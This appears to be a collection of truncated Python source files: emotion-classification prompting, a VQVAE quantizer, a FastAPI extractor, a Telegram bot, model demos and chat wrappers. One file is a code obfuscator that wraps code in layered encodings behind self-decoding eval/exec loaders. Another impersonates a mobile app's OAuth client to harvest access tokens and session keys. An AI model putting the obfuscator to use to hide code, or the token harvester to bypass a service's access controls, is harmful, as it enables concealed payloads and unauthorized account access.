 \"optimism\",\n                \"pride\",\n                \"realization\",\n                \"relief\",\n                \"remorse\",\n                \"sadness\",\n                \"surprise\",\n                \"neutral\"]\n\n\ndef generate_text(project_id: str, location: str, prompt: str, model) -> str:\n    # Initialize Vertex AI\n    vertexai.init(project=project_id, location=location)\n    responses = model.generate_content(prompt,\n                                       generation_config=generation_config,\n                                       stream=False)\n    for response in responses:\n        return response.text\n\ndef select_data(given_dataset, number_of_turns):\n    selected_data_list = []\n    label_to_data_dict = {}\n    for data in given_dataset:\n        if len(data['labels']) == 1:\n            cur_label = data['labels'][0]\n            if cur_label in label_to_data_dict:\n                label_to_data_dict[cur_label].append(data)\n            else:\n                label_to_data_dict[cur_label] = [data]\n    data_label_list = list(label_to_data_dict.keys())\n    selected_label_to_count = {key:0 for key in data_label_list}\n    for turn in range(number_of_turns):\n        for i, key in enumerate(data_label_list):\n            if len(label_to_data_dict[key]) > selected_label_to_count[key]:\n                selected_data_list.append(label_to_data_dict[key][selected_label_to_count[key]])\n                selected_label_to_count[key] += 1\n            else:\n                for other in range(i+1, len(data_label_list)):\n                    other_key = data_label_list[other]\n                    if len(label_to_data_dict[other_key]) > selected_label_to_count[other_key]:\n                        selected_data_list.append(label_to_data_dict[other_key][selected_label_to_count[other_key]])\n                        selected_label_to_count[other_key] += 1\n                        break\n\n    print(\"selected_data_list: \", selected_data_list)\n    print(\"selected data list length: \", len(selected_data_list))\n    return selected_data_list\n\ndef format_discovery_prompt(data_dict_list, round=0, with_instruction=False, context_token_number=\"2k\"):\n    token_shot_map_dict = {\"2k\": 73, \"5k\": 190, \"10k\": 380, \"15k\": 560, \"20k\": 740, \"25k\": 920,\n                           \"32k\": 1180}\n    prompt = 'Given a comment, please predict the emotion category of this comment. The predict answer must come from the demonstration examples with the exact format.'\n    if with_instruction:\n        prompt = prompt + 'You can only make prediction from the following categories: '\n        for i, word in enumerate(all_labels):\n            if i != len(all_labels) - 1:\n                prompt = prompt + word + ', '\n            else:\n                prompt = prompt + word + '.\\n'\n    prompt = prompt + ' The examples are as follows: \\n'\n    if round != 0:\n        index = len(data_dict_list)\n        print(f\"======={round} round running========\")\n        print(\"number of instances: \", index)\n    else:\n        index = token_shot_map_dict[context_token_number]\n    data_list = data_dict_list[:index]\n    for data in data_list:\n        prompt = prompt + \"comment: \" + data['text'] + \"\\nemotion category: \" + all_labels[data['labels'][0]] + '\\n'\n    return prompt\n\nparser = argparse.ArgumentParser(description=\"Long in-context Learning\",\n                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument(\"-c\", \"--context_length\", type=str, default='2k', help=\"number of tokens the context have\")\nparser.add_argument(\"-m\", \"--model\", type=str, help=\"model name to test\")\nparser.add_",
    "from typing import List, Optional, Sequence, Tuple, Union\n\nimport numpy as np\nimport torch\nfrom torch import distributed as tdist, nn as nn\nfrom torch.nn import functional as F\n\nimport dist\n\n\n# this file only defines the VectorQuantizer2 used in VQVAE\n__all__ = ['VectorQuantizer2',]\n\n\nclass VectorQuantizer2(nn.Module):\n    # VQGAN originally use beta=1.0, never tried 0.25; SD seems using 0.25\n    def __init__(\n        self, vocab_size, Cvae, using_znorm, beta: float = 0.25,\n        default_qresi_counts=0, v_patch_nums=None, quant_resi=0.5, share_quant_resi=4,  # share_quant_resi: args.qsr\n    ):\n        super().__init__()\n        self.vocab_size: int = vocab_size\n        self.Cvae: int = Cvae\n        self.using_znorm: bool = using_znorm\n        self.v_patch_nums: Tuple[int] = v_patch_nums\n        \n        self.quant_resi_ratio = quant_resi\n        if share_quant_resi == 0:   # non-shared: \\phi_{1 to K} for K scales\n            self.quant_resi = PhiNonShared([(Phi(Cvae, quant_resi) if abs(quant_resi) > 1e-6 else nn.Identity()) for _ in range(default_qresi_counts or len(self.v_patch_nums))])\n        elif share_quant_resi == 1: # fully shared: only a single \\phi for K scales\n            self.quant_resi = PhiShared(Phi(Cvae, quant_resi) if abs(quant_resi) > 1e-6 else nn.Identity())\n        else:                       # partially shared: \\phi_{1 to share_quant_resi} for K scales\n            self.quant_resi = PhiPartiallyShared(nn.ModuleList([(Phi(Cvae, quant_resi) if abs(quant_resi) > 1e-6 else nn.Identity()) for _ in range(share_quant_resi)]))\n        \n        self.register_buffer('ema_vocab_hit_SV', torch.full((len(self.v_patch_nums), self.vocab_size), fill_value=0.0))\n        self.record_hit = 0\n        \n        self.beta: float = beta\n        self.embedding = nn.Embedding(self.vocab_size, self.Cvae)\n        \n        # only used for progressive training of VAR (not supported yet, will be tested and supported in the future)\n        self.prog_si = -1   # progressive training: not supported yet, prog_si always -1\n    \n    def eini(self, eini):\n        if eini > 0: nn.init.trunc_normal_(self.embedding.weight.data, std=eini)\n        elif eini < 0: self.embedding.weight.data.uniform_(-abs(eini) / self.vocab_size, abs(eini) / self.vocab_size)\n    \n    def extra_repr(self) -> str:\n        return f'{self.v_patch_nums}, znorm={self.using_znorm}, beta={self.beta}  |  S={len(self.v_patch_nums)}, quant_resi={self.quant_resi_ratio}'\n    \n    # ===================== `forward` is only used in VAE training =====================\n    def forward(self, f_BChw: torch.Tensor, ret_usages=False) -> Tuple[torch.Tensor, List[float], torch.Tensor]:\n        dtype = f_BChw.dtype\n        if dtype != torch.float32: f_BChw = f_BChw.float()\n        B, C, H, W = f_BChw.shape\n        f_no_grad = f_BChw.detach()\n        \n        f_rest = f_no_grad.clone()\n        f_hat = torch.zeros_like(f_rest)\n        \n        with torch.cuda.amp.autocast(enabled=False):\n            mean_vq_loss: torch.Tensor = 0.0\n            vocab_hit_V = torch.zeros(self.vocab_size, dtype=torch.float, device=f_BChw.device)\n            SN = len(self.v_patch_nums)\n            for si, pn in enumerate(self.v_patch_nums): # from small to large\n                # find the nearest embedding\n                if self.using_znorm:\n                    rest_NC = F.interpolate(f_rest, size=(pn, pn), mode='area').permute(0, 2, 3, 1).reshape(-1, C) if (si != SN-1) else f_rest.permute(0, 2, 3, 1).reshape(-1, C)\n                    rest_NC = F.normalize(rest_NC, dim=-1)\n                    idx_N = torch.argmax(rest_NC @ F.normalize(self.embedding.weight.data.T, dim=0), dim=1)\n                else:\n                    rest_NC = F.interpolate(f_rest, size=(pn, pn), mode='area').permute(0, 2, 3, 1).reshape(-1, C) if (si != SN-1) else f_rest.permute(0, 2, 3, 1).reshape(-1, C)\n                    d_no_grad = torch.sum(rest_NC.square(), dim=1, keepdim=True) + torch.sum(self.embedding.weight.data.square(), dim=1, keepdim=False)\n                    d_no_grad.addmm_(rest_NC, self.embedding.weight.data.T, alpha=-2, beta=1)  # (B*h*w, vocab_size)\n                    idx_N = torch.argmin(d_no_grad, dim=1)\n                \n                hit_V = idx_N.bincount(minlength=self.vocab_size).float()\n                if self.training:\n                    if dist.initialized(): handler = tdist.all_reduce(hit_V, async_op=True)\n                \n                # calc loss\n                idx_Bhw = idx_N.view(B, pn, pn)\n                h_BChw = F.interpolate(self.embedding(idx_Bhw).permute(0, 3, 1, 2), size=(H, W), mode='bicubic').contiguous() if (si != SN-1) else self.embedding(idx_Bhw).permute(0, 3, 1, 2).contiguous()\n                h_BChw = self.quant_resi[si/(SN-1)](h_BChw)\n                f_hat = f_hat + h_BChw\n                f_rest -= h_BChw\n                \n                if self.training and dist.initialized():\n                    handler.wait()\n                    if self.record_hit == 0: self.ema_voca",
    "from typing import List\nfrom fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse\nfrom pydantic import BaseModel\n\n\nimport instructor\nimport openai\n\napp = FastAPI()\nclient = instructor.from_openai(openai.OpenAI(), model=\"gpt-4-turbo-preview\")\n\n\nclass Property(BaseModel):\n    name: str\n    value: str\n\n\nclass User(BaseModel):\n    name: str\n    age: int\n    properties: List[Property]\n\n\n@app.post(\"/v1/extract_user\", response_model=User)\ndef extract_user(text: str):\n    user = client.chat.completions.create(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n    return user\n\n\n@app.post(\"/v1/extract_user_stream\")\ndef extract_user_stream(text: str):\n    user_stream = client.chat.completions.create_partial(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n\n    def stream():\n        for partial_user in user_stream:\n            yield f\"data: {partial_user.model_dump_json()}\\n\\n\"\n\n    return StreamingResponse(stream(), media_type=\"text/event-stream\")\n",
    "import asyncio\nimport re\nfrom copy import deepcopy\nfrom typing import Optional, Any\n\nfrom .request import req\nfrom .ass import ass\n\n\ndef parse_markdown(text: str, p: bool = False) -> str:\n    text = re.sub(r\"&\", \"&amp;\", text)\n    text = re.sub(r\"<\", \"&lt;\", text)\n    text = re.sub(r\">\", \"&gt;\", text)\n\n    patterns = [\n        (r'(http[s]?://[^(\\s|\")]+)', '<a href=\"\\\\1\">\\\\1</a>'),\n        (r\"^# (.*)$\", \"<h1>\\\\1</h1>\"),\n        (r\"\\*\\*(.+?)\\*\\*\", \"<b>\\\\1</b>\"),\n        (r\"__(.+?)__\", \"<i>\\\\1</i>\"),\n        (r\"```(\\w+)\\n(.*?)```\", '<pre><code class=\"language-\\\\1\">\\\\2</code></pre>'),\n        (r\"```\\n(.*?)```\", \"<pre><code>\\\\1</code></pre>\"),\n        (r\"`([^`]+)`\", \"<code>\\\\1</code>\"),\n        (r\"^> (.*)\", \"<blockquote>\\\\1</blockquote>\"),\n    ]\n    for pattern, replacement in patterns:\n        text = re.sub(pattern, replacement, text, flags=re.MULTILINE | re.DOTALL)\n\n    if p:\n        lines = text.split(\"\\n\")\n        in_code = False\n        for i, line in enumerate(lines):\n            line = line.strip()\n            if line.startswith(\"<pre\"):\n                in_code = True\n            if \"</pre>\" in line:\n                in_code = False\n                continue\n            if not in_code:\n                lines[i] = \"<p>\" + line + \"</p>\"\n\n        text = \"\\n\".join(lines)\n\n    return text\n\n\ndef extract_value(data: dict[str, Any], dotted: str, default: Any = None) -> Any:\n    if \".\" not in dotted:\n        return data.get(dotted, default)\n    segment, other = dotted.split(\".\", 1)\n    if segment not in data:\n        return default\n    return extract_value(data[segment], other)\n\n\nclass MiniGramMessage:\n    def __init__(self, data: dict):\n        self.data = deepcopy(data)\n        if \"message\" not in self.data:\n            raise ValueError(\"no `message` in your data!\")\n        msg = self.data[\"message\"]\n        self.chat_id = extract_value(msg, \"chat.id\")\n        self.text = extract_value(msg, \"text\")\n        self.message_id = extract_value(msg, \"message_id\")\n        self.from_user = extract_value(msg, \"from\", {})\n        self.from_id = self.from_user.get(\"id\")\n\n    def __repr__(self):\n        return f\"<MiniGramMessage from {self.from_id}/{self.from_user} {self.chat_id} {self.message_id} {self.text}>\"\n\n    def reply(self, text: str) -> \"MiniGramMessage\":\n        self.text = text\n        return self\n\n\nclass MiniGram:\n    def __init__(self, key: str):\n        global CURRENT\n        self.key = key\n        self.last_updated_id = 0\n        self.post_init()\n        CURRENT = self\n\n    def post_init(self):\n        pass\n\n    @ass\n    async def shutdown(self):\n        await self.delete_webhook()\n\n    @ass\n    async def incoming(self, msg: MiniGramMessage) -> Optional[MiniGramMessage]:\n        pass\n\n    @classmethod\n    def current(cls) -> \"MiniGram\":\n        global CURRENT\n        if CURRENT is None:\n            raise ValueError(\"No current MiniGram\")\n        return CURRENT\n\n    @ass\n    async def req(self, method: str, **kwargs) -> dict:\n        url = f\"https://api.telegram.org/bot{self.key}/{method}\"\n        code, response = await req(url, kwargs)\n        return response\n\n    @ass\n    async def start_polling(self):\n        while True:\n            updates = await self.get_updates()\n            for update in updates.get(\"result\", []):\n                msg = MiniGramMessage(update)\n                res = await self.incoming(msg)\n                if res:\n                    await self.reply_to_message(res)\n                self.last_updated_id = update[\"update_id\"]\n            await asyncio.sleep(0.1)\n\n    @ass\n    async def get_updates(self) -> dict:\n        if self.last_updated_id != 0:\n            return await self.req(\n                \"getUpdates\", offset=self.last_updated_id + 1, timeout=60\n            )\n        return await self.req(\"getUpdates\", timeout=60)\n\n    @ass\n    async def send_text(\n        self, chat_id: int, text: str, parse_mode: str = \"HTML\", **kwargs\n    ) -> dict:\n        return await self.req(\n            \"sendMessage\", chat_id=chat_id, text=text, parse_mode=parse_mode, **kwargs\n        )\n\n    @ass\n    async def reply_to_message(self, reply: MiniGramMessage):\n        reply_params = {\n            \"chat_id\": reply.chat_id,\n            \"text\": reply.text,\n            \"reply_to_message_id\": reply.message_id,\n        }\n        return await self.req(\"sendMessage\", **reply_params)\n\n    @ass\n    async def set_webhook(self, url: str) -> dict:\n        return await self.req(\"setWebhook\", url=url)\n\n    @ass\n    async def delete_webhook(self) -> dict:\n        return await self.req(\"deleteWebhook\")\n\n    @ass\n    async def get_webhook_info(self) -> dict:\n        return await self.req(\"getWebhookInfo\")\n\n    async def async_handler(self, data: dict) -> None:\n        msg = MiniGramMessage(data)\n        res = await self.incoming(msg)\n        if res:\n            await self.reply_to_message(res)\n\n    def sync_handler(self, data: dict) -> None:\n        msg = MiniGramMessage(data)\n        res = self.incoming(msg)\n        if res:\n   ",
    "import os\r\nimport base64 \r\nimport argparse\r\nimport codecs\r\nimport random\r\nimport string\r\nfrom colorama import Fore\r\n\r\n\r\nclass Obfuscator:\r\n    def __init__(self, code):\r\n        self.code = code\r\n        self.__obfuscate()\r\n    \r\n    def __xorED(self, text, key = None):\r\n        newstring = \"\"\r\n        if key is None:\r\n            key = \"\".join(random.choices(string.digits + string.ascii_letters, k= random.randint(4, 8)))\r\n        if not key[0] == \" \":\r\n            key = \" \" + key\r\n        for i in range(len(text)):\r\n            newstring += chr(ord(text[i]) ^ ord(key[(len(key) - 2) + 1]))\r\n        return (newstring, key)\r\n\r\n    def __encodestring(self, string):\r\n        newstring = ''\r\n        for i in string:\r\n            if random.choice([True, False]):\r\n                newstring += '\\\\x' + codecs.encode(i.encode(), 'hex').decode()\r\n            else:\r\n                newstring += '\\\\' + oct(ord(i))[2:]\r\n        return newstring\r\n\r\n    def __obfuscate(self):\r\n        xorcod = self.__xorED(self.code)\r\n        self.code = xorcod[0]\r\n        encoded_code = base64.b64encode(codecs.encode(codecs.encode(self.code.encode(), 'bz2'), 'uu')).decode()\r\n        encoded_code = [encoded_code[i:i + int(len(encoded_code) / 4)] for i in range(0, len(encoded_code), int(len(encoded_code) / 4))]\r\n        new_encoded_code = []\r\n        new_encoded_code.append(codecs.encode(encoded_code[0].encode(), 'uu').decode() + 'u')\r\n        new_encoded_code.append(codecs.encode(encoded_code[1], 'rot13') + 'r')\r\n        new_encoded_code.append(codecs.encode(encoded_code[2].encode(), 'hex').decode() + 'h')\r\n        new_encoded_code.append(base64.b85encode(codecs.encode(encoded_code[3].encode(), 'hex')).decode() + 'x')\r\n        self.code = f\"\"\"\r\n_0x711=eval(\"{self.__encodestring('eval')}\");_0x711__=_0x711(\"{self.__encodestring('compile')}\");_0x711_,____=_0x711(_0x711__(\"{self.__encodestring(\"__import__('base64')\")}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring(\"__import__('codecs')\")}\",\"\",_0x711.__name__));_0x711_0x711_0x711_0x711=_0x711(\"'{self.__encodestring(xorcod[True])}'\");_0x711___,_0x711____,_0x711_0x711,_0x711_0x711_=_0x711(_0x711__(\"{self.__encodestring('exec')}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring('str.encode')}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring('isinstance')}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring('bytes')}\",\"\",_0x711.__name__))\r\ndef _0x711_0x711_0x711____(_0x711_0x711, _0x711_0x711_):\r\n    _0x711_0x711=_0x711_0x711.decode()\r\n    _0x711____=\"\"\r\n    if not _0x711_0x711_[False]==\"{self.__encodestring(' ')}\":\r\n        _0x711_0x711_=\"{self.__encodestring(' ')}\"+_0x711_0x711_\r\n    for _ in range(_0x711(\"{self.__encodestring('len(_0x711_0x711)')}\")):\r\n        _0x711____+=_0x711(\"{self.__encodestring('chr(ord(_0x711_0x711[_])^ord(_0x711_0x711_[(len(_0x711_0x711_) - True*2) + True]))')}\")\r\n    return (_0x711____,_0x711_0x711_)\r\ndef _0x711_0x711__(_0x711_0x711___):\r\n    if(_0x711_0x711___[-True]!=_0x711(_0x711__(\"'{self.__encodestring('c_0x711_0x711_0x711_6s5_0x711_0x711_0x711_6ardv8')}'[-True*4]\",\"\",_0x711.__name__))):_0x711_0x711___ = _0x711____(_0x711_0x711___)\r\n    if not(_0x711_0x711(_0x711_0x711___, _0x711_0x711_)):_0x711_0x711___ = _0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('rot13')}')\",\"\",_0x711.__name__))\r\n    else:\r\n        if(_0x711_0x711___[-True]==_0x711(_0x711__(\"b'{self.__encodestring('f5sfsdfauf85')}'[-True*4]\",\"\", _0x711.__name__))):\r\n            _0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('uu')}')\",\"\",_0x711.__name__))\r\n        elif (_0x711_0x711___[-True] ==_0x711(_0x711__(\"b'{self.__encodestring('d5sfs1dffhsd8')}'[-True*4]\",\"\", _0x711.__name__))):_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('hex')}')\",\"\",_0x711.__name__))\r\n        else:_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('_0x711_.b85decode(_0x711_0x711___[:-True])')}\",\"\",_0x711.__name__));_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___')}, '{self.__encodestring('hex')}')\",\"\",_0x711.__name__))\r\n        _0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode(_0x711_0x711___)')}\",\"\",_0x711.__name__))\r\n    return _0x711_0x711___\r\n_0x711_0x711_0x711__=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*3]).encode()})\",\"\",_0x711.__name__));_0x711_0x711_0x711_ = _0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[1]).encode()})\",\"\",_0x711.__name__));_0x711_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*2]).encode()})\",\"\",_0x711.__name__));_0x711_0x711____=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_co",
    "import argparse\nimport torch\n\nimport gradio as gr\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\n\n\ntokenizer, model = None, None\n\n\ndef init_model(args):\n    global tokenizer, model\n    tokenizer = AutoTokenizer.from_pretrained(args.tokenizer_path, truncation_side=\"left\", padding_side=\"left\")\n    model = AutoModelForCausalLM.from_pretrained(args.model_path, trust_remote_code=True, torch_dtype=torch.bfloat16, device_map='auto')\n    model = model.eval()\n\n\ndef batch_call(texts, skip_special_tokens=True, **kwargs):\n    tokenized = tokenizer(texts, padding=True, return_tensors=\"pt\")\n    inputs = {key: value.cuda() for key, value in tokenized.items() if key != 'token_type_ids'}\n    generate_ids = model.generate(**inputs, **kwargs)\n\n    output =[]\n    for tok, gen in zip(tokenized.input_ids, generate_ids):\n        generated = tokenizer.decode(gen[len(tok):], skip_special_tokens=skip_special_tokens)\n        output.append(generated)\n    return output\n\n\ndef text_generation(texts, max_new_tokens, temperature, top_k, top_p):\n    output = batch_call(texts, max_new_tokens=max_new_tokens, do_sample=True, top_k=top_k, top_p=top_p, temperature=temperature, eos_token_id=tokenizer.eos_token_id)\n    return output[0]\n\n\ndef get_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--port\", type=int, default=20014,\n                        help=\"server port\")\n    parser.add_argument(\"--model_path\", type=str, default=\"./model\",\n                        help=\"Path to the model. Specifies the file path to the pre-trained model to be used for text generation.\")\n    parser.add_argument(\"--tokenizer_path\", type=str, default=\"./model\",\n                        help=\"Path to the tokenizer.\")\n    args = parser.parse_args()\n    return args\n\n\nif __name__ == \"__main__\":\n    args = get_args()\n\n    # initialize model and tokenizer\n    init_model(args)\n\n    with gr.Blocks() as demo:\n        gr.Markdown(\n            \"# <center>{}</center>\".format(\"XVERSE-MoE-25B Text Generation\"))\n        with gr.Row():\n            with gr.Column():\n                inputs = gr.inputs.Textbox(\n                    lines=5, label=\"Input Text\")  # input\n                with gr.Column():\n                    max_new_tokens = gr.Slider(maximum=512, value=100, minimum=1, step=1,\n                                               label=\"max_new_tokens\", interactive=True)  # max_new_tokens\n                    temperature = gr.Slider(maximum=1.0, value=1.0, minimum=0.0, step=0.05,\n                                            label='temperature', interactive=True)  # temperature\n                    top_k = gr.Slider(maximum=50, value=50, minimum=0, step=1,\n                                      label='Top K', interactive=True)  # top_k\n                    top_p = gr.Slider(maximum=1, value=0.92, minimum=0,\n                                      step=0.02, label='Top P', interactive=True)  # top_p\n\n            with gr.Row():\n                outputs = gr.inputs.Textbox(lines=2, label=\"Output Text\")\n\n        with gr.Row():\n            submit_btn = gr.Button(value=\"\u751f\u6210\", variant=\"secondary\")\n            reset_btn = gr.ClearButton(components=[inputs, outputs], value=\"\u6e05\u9664\", variant=\"secondary\")\n\n        submit_btn.click(fn=text_generation,\n                         inputs=[inputs, max_new_tokens,\n                                 temperature, top_k, top_p],\n                         outputs=outputs)\n\n    demo.launch(server_name=\"0.0.0.0\", server_port=args.port)\n",
    "import base64\nimport hashlib\nimport json\nimport os\nimport time\n\nimport click\nimport requests\nfrom DrissionPage import WebPage, ChromiumOptions\n\n\ndef to_time(t: int = None):\n    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t))\n\n\ndef to_timestamp(t: str = None):\n    return time.strptime(t, '%Y-%m-%d %H:%M:%S') if t else time.time()\n\n\nclass TokenManager:\n    def __init__(\n            self,\n            refresh_token=None,\n            refresh_interval=60,\n            storage_path='./token.json',\n            proxy='http://127.0.0.1:1082',\n    ):\n        self.refresh_token = refresh_token\n        self.refresh_interval = refresh_interval\n        self.access_token = None\n        self.storage_path = storage_path\n        self.co = ChromiumOptions()\n        if proxy:\n            self.co.set_proxy(proxy)\n            self.proxy = {'all': proxy}\n        else:\n            self.proxy = None\n        self.load_token()\n\n    def get_refresh_token(self):\n        self.ensure_refresh_token()\n        return self.refresh_token\n\n    def get_access_token(self):\n        if self.is_expired():\n            self.refresh()\n        return self.access_token\n\n    def get_sess_key(self):\n        response = requests.post(\n            'https://api.openai.com/dashboard/onboarding/login',\n            headers={\n                \"Authorization\": f\"Bearer {self.get_access_token()}\",\n                \"Content-Type\": \"application/json\",\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0\",\n            },\n            proxies=self.proxy\n        )\n        if response.ok:\n            data = json.loads(response.text)\n            return {\n                'sess_key': data['user']['session']['sensitive_id'],\n                'created': to_time(data['user']['session']['created']),\n                'last_use': to_time(data['user']['session']['last_use']),\n            }\n\n    def is_expired(self):\n        if not self.access_token:\n            return True\n        payload = self.access_token.split('.')[1]\n        payload = payload + '=' * - (len(payload) % - 4)\n        exp = json.loads(base64.b64decode(payload).decode()).get('exp')\n        return exp - time.time() < 60\n\n    def refresh(self):\n        self.ensure_refresh_token()\n        if self.is_expired():\n            self.access_token = self.generate_access_token()\n        self.save_token()\n\n    def ensure_refresh_token(self):\n        if self.refresh_token:\n            return\n        code_verifier = self.generate_code_verifier()\n        code_challenge = self.generate_code_challenge(code_verifier)\n        preauth_cookie = self.get_preauth_cookie()\n        url = f'https://auth0.openai.com/authorize' \\\n              f'?client_id=pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh' \\\n              f'&audience=https%3A%2F%2Fapi.openai.com%2Fv1' \\\n              f'&redirect_uri=com.openai.chat%3A%2F%2Fauth0.openai.com%2Fios%2Fcom.openai.chat%2Fcallback' \\\n              f'&scope=openid%20email%20profile%20offline_access%20model.request%20model.read%20organization.read%20offline' \\\n              f'&response_type=code' \\\n              f'&code_challenge={code_challenge}' \\\n              f'&code_challenge_method=S256' \\\n              f'&preauth_cookie={preauth_cookie}'\n\n        url += '&prompt=login'\n        # print(url)\n        # code = input('code: ')\n        page = WebPage(chromium_options=self.co)\n        page.get(url)\n        page.listen.start('com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback')\n        res = page.listen.wait()\n        code = res.url.split('code=')[1]\n        page.close()\n        resp_json = requests.post('https://auth0.openai.com/oauth/token', json={\n            'redirect_uri': 'com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback',\n            'grant_type': 'authorization_code',\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'code': code,\n            'code_verifier': code_verifier\n        }, proxies=self.proxy).json()\n        # print(json.dumps(resp_json, indent=2))\n        self.refresh_token = resp_json.get('refresh_token')\n        self.access_token = resp_json.get('access_token')\n        # self.id_token = resp_json.get('id_token')\n\n    def revoke_refresh_token(self, refresh_token):\n        resp = requests.post('https://auth0.openai.com/oauth/revoke', json={\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'token': refresh_token\n        }, proxies=self.proxy)\n        assert resp.status_code == 200\n\n    @staticmethod\n    def generate_code_verifier():\n        return base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip('=')\n\n    @staticmethod\n    def generate_code_challenge(code_verifier):\n        m = hashlib.sha256()\n        m.update(code_verifier.encode())\n        return base64.urlsafe_b64encode(m.digest()).decode().rstrip('=')\n\n    @staticmethod\n    def get_preauth_cookie():\n        # fakeopen\u5df2\u6302\n        # return requests.get('https:",
    "import torch\nimport tiktoken\nfrom dataclasses import dataclass\nfrom typing import Any, Dict, Generator, List, Literal, Optional, Tuple\nfrom threading import Thread\nfrom transformers import GenerationConfig, TextIteratorStreamer\n\nfrom llmtuner.data.template import get_template_and_fix_tokenizer\nfrom llmtuner.extras.misc import get_logits_processor\nfrom llmtuner.model import dispatch_model, get_infer_args, load_model_and_tokenizer\n\n\n@dataclass\nclass Response:\n\n    response_text: str\n    response_length: int\n    prompt_length: int\n    finish_reason: Literal[\"stop\", \"length\"]\n\n\nclass ChatModel:\n\n    def __init__(self, args: Optional[Dict[str, Any]] = None) -> None:\n        model_args, data_args, finetuning_args, self.generating_args = get_infer_args(args)\n        self.can_generate = (finetuning_args.stage == \"sft\")\n        self.model, self.tokenizer = load_model_and_tokenizer(\n            model_args, finetuning_args, is_trainable=False, add_valuehead=(not self.can_generate)\n        )\n        self.tokenizer.padding_side = \"left\" if self.can_generate else \"right\"\n        self.model = dispatch_model(self.model)\n        self.template = get_template_and_fix_tokenizer(data_args.template, self.tokenizer)\n\n    def _process_args(\n        self,\n        query: str,\n        history: Optional[List[Tuple[str, str]]] = None,\n        system: Optional[str] = None,\n        **input_kwargs\n    ) -> Tuple[Dict[str, Any], int]:\n        prompt, _ = self.template.encode_oneturn(\n            tokenizer=self.tokenizer, query=query, resp=\"\", history=history, system=system\n        )\n        prompt_length = len(prompt)\n        input_ids = torch.tensor([prompt], device=self.model.device)\n\n        do_sample = input_kwargs.pop(\"do_sample\", None)\n        temperature = input_kwargs.pop(\"temperature\", None)\n        top_p = input_kwargs.pop(\"top_p\", None)\n        top_k = input_kwargs.pop(\"top_k\", None)\n        num_return_sequences = input_kwargs.pop(\"num_return_sequences\", None)\n        repetition_penalty = input_kwargs.pop(\"repetition_penalty\", None)\n        max_length = input_kwargs.pop(\"max_length\", None)\n        max_new_tokens = input_kwargs.pop(\"max_new_tokens\", None)\n\n        generating_args = self.generating_args.to_dict()\n        generating_args.update(dict(\n            do_sample=do_sample if do_sample is not None else generating_args[\"do_sample\"],\n            temperature=temperature or generating_args[\"temperature\"],\n            top_p=top_p or generating_args[\"top_p\"],\n            top_k=top_k or generating_args[\"top_k\"],\n            num_return_sequences=num_return_sequences or 1,\n            repetition_penalty=repetition_penalty or generating_args[\"repetition_penalty\"],\n            eos_token_id=[self.tokenizer.eos_token_id] + self.tokenizer.additional_special_tokens_ids,\n            pad_token_id=self.tokenizer.pad_token_id\n        ))\n\n        if isinstance(num_return_sequences, int) and num_return_sequences > 1:\n            generating_args[\"do_sample\"] = True\n\n        if max_length:\n            generating_args.pop(\"max_new_tokens\", None)\n            generating_args[\"max_length\"] = max_length\n\n        if max_new_tokens:\n            generating_args.pop(\"max_length\", None)\n            generating_args[\"max_new_tokens\"] = max_new_tokens\n\n        gen_kwargs = dict(\n            inputs=input_ids,\n            generation_config=GenerationConfig(**generating_args),\n            logits_processor=get_logits_processor()\n        )\n\n        return gen_kwargs, prompt_length\n\n    @torch.inference_mode()\n    def chat(\n        self,\n        query: str,\n        history: Optional[List[Tuple[str, str]]] = None,\n        system: Optional[str] = None,\n        **input_kwargs\n    ) -> List[Response]:\n        r\"\"\"\n        Args: query, history, system, **input_kwargs\n\n        Returns: [(response_text, prompt_length, response_length)] * n (default n=1)\n        \"\"\"\n        gen_kwargs, prompt_length = self._process_args(query, history, system, **input_kwargs)\n        generate_output = self.model.generate(**gen_kwargs)\n        response_ids = generate_output[:, prompt_length:]\n        response = self.tokenizer.batch_decode(\n            response_ids, skip_special_tokens=True, clean_up_tokenization_spaces=True\n        )\n        results = []\n        for i in range(len(response)):\n            eos_index = (response_ids[i] == self.tokenizer.eos_token_id).nonzero()\n            response_length = (eos_index[0].item() + 1) if len(eos_index) else len(response_ids[i])\n            results.append(Response(\n                response_text=response[i],\n                response_length=response_length,\n                prompt_length=prompt_length,\n                finish_reason=\"stop\" if len(eos_index) else \"length\"\n            ))\n\n        return results\n\n    @torch.inference_mode()\n    def stream_chat(\n        self,\n        query: 